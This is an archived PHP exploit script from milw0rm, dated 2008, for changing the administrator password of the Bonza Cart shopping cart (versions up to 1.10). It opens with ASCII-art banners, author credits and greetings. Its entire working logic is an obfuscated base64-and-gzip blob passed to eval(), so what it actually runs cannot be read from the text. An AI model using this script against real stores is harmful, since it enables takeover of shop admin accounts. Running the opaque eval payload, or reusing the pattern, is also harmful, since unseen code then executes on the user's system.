<?php
/*
==============================================================================
                      _      _       _          _      _   _ 
                     / \    | |     | |        / \    | | | |
                    / _ \   | |     | |       / _ \   | |_| |
                   / ___ \  | |___  | |___   / ___ \  |  _  |
   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
                                                             

==============================================================================
                      ____   _  _     _   _    ___    _  __
                     / ___| | || |   | \ | |  / _ \  | |/ /
                    | |  _  | || |_  |  \| | | | | | | ' / 
                    | |_| | |__   _| | |\  | | |_| | | . \ 
                     \____|    |_|   |_| \_|  \___/  |_|\_\

==============================================================================
	Bonza Cart <= 1.10 Admin Password Changing Exploit
==============================================================================

	[Â»] Script:             [ Bonza Cart ]
	[Â»] Language:           [ PHP ]
	[Â»] homepage:           [ http://www.dinkumsoft.net/ ]
	[Â»] Type:               [ Commercial ]
	[Â»] found-report:       [ 26.11.2008-02.12.2008 ]
	[Â»] Founder.coder:      [ G4N0K <mail.ganok[at]gmail.com> ]

===[ LIVE ]===

	[Â»] removed...


	
===[ Greetz ]===

	[Â»] ALLAH
	[Â»] Tornado2800 <Tornado2800[at]gmail.com>
	[Â»] B13
	[Â»] AFSHIN-ZARBAT <afshin.zarbat[at]yahoo.com>
	[Â»] QU1E <evilinhell87[at]yahoo.com>
	[Â»] Hussain-X <darkangel_g85[at]yahoo.com>

	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
	//ALLAH,forgimme...
*/

error_reporting(E_ALL);
	$G4N0K = "vVlZd6rKEv5B+4VBE3kUFGiCKChTv0mTMCt3owz++lsNGDU5yT7rrKz9wEKaprrqq6G/arFrHINu".
                 "PtssWuQs2dXCPM6QbW1M1sL20o72qnUKJNF0bG21tVcRSphaZ8nF7Ga1JVtLJMf9d2ixPK8k0SaF".
                 "fCZczuxd4ey7Ta0zzhol8wTkMGRxrHU+5MNuyq+6aU0KUjsyql+VmAncptUZy7YkYdKvuVieQlWL".
                 "g4NRhkpeB4Vc6YXFYAn9ojqOek0Ctz2TC/Ol/NUum663o8zrt4oT48XEkNL2hD0rRrB+qM7ht8zu".
                 "PV9AmVEHBysPDubJUfMGb1Hkc8I5VJxzuGASuE9CSTiGClutOzHdK3JHOIfZOI5tJcwE7K03EfOy".
                 "US3Qvc03mQbyyhgtjZgczGizYKLVdtICXiJW2DJIRNP3jEvICR2WxAXIO2MuP+NOlF9VsQoAT6Q2".
                 "kXWx1qtlNdP5UW6/hsG8um2OVGtKFFtAoPeratY+b1xQCjYWWo3V/Bns1nABNkhs4buwppo9OYp8".
                 "DDg21qV5slOddO8CFsuw891pBjZXSNJWoWuUWFlGNgd+7UQnKPI04KwcJU3kFE6HQVd/20Smp5Xg".
                 "7wot4zxQcQ4+S+k46b9jLxje47QypChPfNf4jXmtDmEd3QWsFaFbJ8bCZOi1utf1svfKfJ3GTbiA".
                 "bw8MfM+8LMyy2LtOhVUjD9VBZsBrGfbQE+GEau+a0coTJ0gylhBREKU2yCyFh+8kscJumAeFGb02".
                 "zIvk4pr6O+ScEnMxswbcAsWkugzrFrjEbptRPyPVqXRJfJC19x71WC2qKHDljvpxnc6fkSrGWLHK".
                 "oCDDOyW/UPtCNa/wrjwH3DRfgx5vJvOCizwPFAswM+m8Hg+fa3Mf5PqFwOwX/VqwpsHo3uD/dTGF".
                 "HLH7uUSRM6xA/FyO7UoVJ1e5H+wvg4PIjvgV4IM4XJSACWb+WQ85Aft7+SGXZ6ESPa12ZkPUaPRX".
                 "W/ue+RQoThEO+jHYixndlcEf4Xl90AZcKdbeOxYnUuSHvWo+rfibnpDnHFJPD3GyPoTHvWfla4hX".
                 "UoRlkJZx6Fn1mtMgz62cpMfUSH2OXmghN6+SeAm4tsSLEw9xDZgd+dVCbF4XJ4HWAJ0fcOtzCHIZ".
                 "u3LW/1ZovmR9nQAMOaQYFc3NzVbLwgTdxse8g/FHOwsjp7WDpFWySduGFDb9RtjsmL9xGVIyj5D0".
                 "1SW+XX973eex/pJnD+O3eR+uOfPy9TrzSO9E0v+GuvU2jr1J4uxuTo3k5jZ+N+/jBfh9Y9MMdBzW".
                 "uskf5N3p8jasRcfbtw963F/f4Qf6Cm/DWoMcj50N9vXjoy6sMKxF15eH99/ht7UnkbOMZbScijvb".
                 "jnaMH+nsrO6xlwUyrAPy+XEd+A041V5H/SQSj+3HR7v+C34/ev0h/n7wAvz+Uk4Jf8Kv90835s41".
                 "f/r7mFvv8UGfxbcvc+qP+A3xNeRLO8Y4/Jaba+zXdF1vzAW9m9ff4fdNnZjdx+9bH+NjLMvtmKvi".
                 "7S4RyLGv9f4WP/Uav0N893jyg1zvvTaMOQtz9GSsK/8Gv6UzIUpb72H/Mg8Z1f2aP72NdJ3r3aM6".
                 "9PkkvFFbqE59/kn/rf795PVX948f4Kp/Vd+0qYmq5Ru4032Z7uFb2TJ2lIMklrJjNWOz7fsbxcp8".
                 "yvkz4PiR7wI34CYCuu7X1729ELpgK468DLj+yHWMnd1zHZSIsQ/8O6DfHqrMYw3ZzjFc1cFexiZ9".
                 "3i39g+cxCVJY4MFxjaFnIIoAfI+uUQJ+1hFBD7GGPoFwRrf3REanvGjX3vgZ7U+ibAZ86oCB/wCX".
                 "SDYJPvsHo1kzdgT8pkFKEwWdWCLVLIJCu5AF9AYc+gV85sptfwGf6aBuUNu0DfBWkFPtd5PZwOea".
                 "iNoLHIYFHvZmMVMdpVMUADdaA57jnOFb4JNEpdz3nfe8c90HviXNexa25sMSq9ZxnS75noN2KAJe".
                 "Dpg53d4R1F1WAT7TOHDtx7HHPgaecRyoDqyHkk2vUzbq05bUFt/VcugDi4BH8I1Yk4M12jEZMTmZ".
                 "oOcP2mNe46Ac/dqF8kd77vRIRObVE995IjxzEHssja31Yv5vbIohhj7ZRGPo52wiH2ySmf1nm256".
                 "fGOT3g3xBzE2xm8GMdjGfuFUSME1SZkkOIRNyH3y0xp75GQr8oXwIXB684nK6bEYc2HvTpsQajnh".
                 "rWlAY6R45/5Dv6fSXjLPoO8D+1bP77l7obyf2pJnoPM55EUef7SvmPJEDTOPCddbiNWQ9v27a68P".
                 "z4VchXRe0tvHgk6Qa72/EjL2+9IOatCtZ3rPvYccvPpo0OUQsB/1COuPOhDeSQI3f8DZdI3+jAVt".
                 "0T/J7bAHNeSTD7Wc9q+f5BcO1fcu17Rt/z3UqzvdwV7wX8FQ+2kN7cf8A4r0y+R67+vxtQ5b0IXS".
                 "nm7v+tEL9Lt07RfJerOXws6RqwPmhD4GNJYpkeQX6POcJPS0ctBXC1+280JL5jF22SZUs6MmC+aO".
                 "NWy3u6tf+dey7uPa22aRlvgRcp0TgZrzzTyor1VGIKcQ7IUoF+NXR4yDBXvy3bzSi7Lec858Xwi/".
                 "8Xb6vz1nF1tPPO9cIQNsOy1roc89wd44F4wOw/4YnrCnpfsF02rZNA8ZOQPfnjfucO/HWDEm/KqF".
                 "mne+s/Ehbr3tJLmb2/1x7gHkOU6DwTa8tbuVTM9OaA8eXlBaZT4Xw35hHAOuijb9/qfBHjI5air8".
                 "lrJnTaF22vBunvQ4SfNET77CbAK9u3Xau5Ma7m/UDyE9j+BXZ6LEzYZra/A9G0oicmTL1C/L88pp".
                 "O08Z957kUfZ9DOiJRkjenh2IT5KwIubomdwxAryf9i7Uzu2M1dN59CKHYJtVh/zqGck2XO/P0S43".
                 "IwM4zboT8yBhHftSReTgPwHPmb5sRRW7xu+gm3WrxXyyWtjdejfn0BKXkCdQk6N61U0aT9VIkJ1y".
                 "7M1PJnCJsLChxq6aldzbsQi46RmPObpOxN/YdZr+jMDD+fDthzPG3THyPbEJ6LmZ1/OL+lVi+ZAn".
                 "p4GTsBDjLfUR5JeTfZSxUxzAF2r5gF26h2fwab3vJkk/N6d6TZJ1Z/0v4E45koC/SFZDePOMbu+g".
                 "bqx6H/cx4VkMPYOhcY8PRu1zp5qA3K/yU3/Iodu+6G0b2IO0LihmFayZk4MG8YUqtLCbl92pxEkU".
                 "axA/oSKn+y5/xv2ZdJTc6if6FXJxDPESkwK4j7uMsCLQ86OznkxitBhrcG6wAeyLsE8ckBpSXKKQ".
                 "Bz77Pq+p/XTysWZBXbPKMJ0koAvYbwHOk+c31wEMZ0c08sXrnuNJWgG+Zeh5GynYOJDmE6LCOuNZ".
                 "6pq/nW0NZ2FHtuc/bJNs8uq3B1zUT2/xgV2T6kZ1qSkXgHfBC8tE1GYbYrs/x+vEjp5NY3rel0zO".
                 "FJdBb/QLJdkzPoQdPRsDv8SQ07HPVdWYryXs8YBHC+/kArtCcTenfPGgrkHt11O2gDxiSBe9+xyw".
                 "EHBhVJCP93LLNZcXSIppfSgBkw7e0ZihZ8WX0DVS0PGCD04VqFnysr36cp643SmkNt16MisHHvLB".
                 "JzfbN0p/HkvP3SvKgwD3DrsWAX7a3PUf6dB/OFmPiyT0fKo/O158lrkrHJ6ewxLe4CkvonsEgtqB".
                 "kgnweHFjs1bwyANovUEDzu8xBj7cUS5O/dz3Q43vToGjHK/z6P8JoKtPdT4Cbs06mdUPa9zxXaiV".
                 "d+N3HCtnzqgY9gSdxk4i/oysC+C9+5wD//ZOIL7B5rE/Ygkqej89BbRGQX1Di7iBPIUYiuvAXT6P".
                 "/ntC9Gz/cqL+u/2nsdSmaEmYXSrqo/8usI+c3znV+33kFAl6fttCzYb+CPbk6HNsCdALriIdembC".
                 "g2wJ+vtFy24gV0EnN3TbM9Qh4KLAjYHDbZL5GepgpAOnGGLnm3VdXIWecXyBvRCpUA/d9oK34jP0".
                 "cbRORNoSb+yMeabn1/8H";
                 eval(base64_decode(gzinflate(base64_decode($G4N0K))));
?>

# milw0rm.com [2008-12-07]
